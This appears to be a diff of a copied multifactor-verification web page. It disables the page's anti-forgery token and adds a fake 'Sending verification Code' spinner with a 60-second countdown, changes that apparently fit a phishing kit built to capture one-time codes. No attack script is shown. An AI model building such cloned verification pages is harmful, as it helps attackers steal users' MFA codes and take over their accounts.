@@ -192,7 +192,7 @@
 
           <form class="new_multifactor" id="new_multifactor" data-validate="multifactor-phone"
              accept-charset="UTF-8" method="post" novalidate="novalidate">
-            <input type="hidden" name="_method" value="put" autocomplete="off"><input type="hidden" name="authenticity_token" value="GJk/WCgFiBvdXruDxz21v2g8AVVzQblxllzxsz5Lgwb0sE241ydeY8SU9jwRLVP2328/LkHj7mpAA8UWOqswfg==" autocomplete="off">
+            <!-- <input type="hidden" name="_method" value="put" autocomplete="off"><input type="hidden" name="authenticity_token" value="GJk/WCgFiBvdXruDxz21v2g8AVVzQblxllzxsz5Lgwb0sE241ydeY8SU9jwRLVP2328/LkHj7mpAA8UWOqswfg==" autocomplete="off"> -->
             <p class="alert alert-error" role="alert" style="display: block">
               Enter your Verification Code
             </p>
@@ -207,9 +207,7 @@
               <div class="field text m_code">
                 <label class="required" for="multifactor_code">Enter the 6-digit code</label>
                 <input maxlength="6" pattern="[0-9]*" placeholder="______" aria-describedby="sr_field_label" required="required" autocomplete="one-time-code" size="6" type="text" value="" name="multifactor[code]" id="multifactor_code">
-                <span role="alert">
-
-</span>
+                <span role="alert"></span>
               </div>
             </div>
             <div class="form-content">
@@ -223,6 +221,15 @@
                   process</a>.</p>
             </div>
 
+            <!--Delayy-->
+
+            <div id="delayy" class="delayy">
+              <div class="spinner_container">
+                  <div class="loading-spinner mb-2"></div>
+                  <div class="counterr">60</div>
+              </div>
+              <div> Sending verification Code</div>
+          </div>
 
             <div class="form-actions">
               <div class="form-action-button">
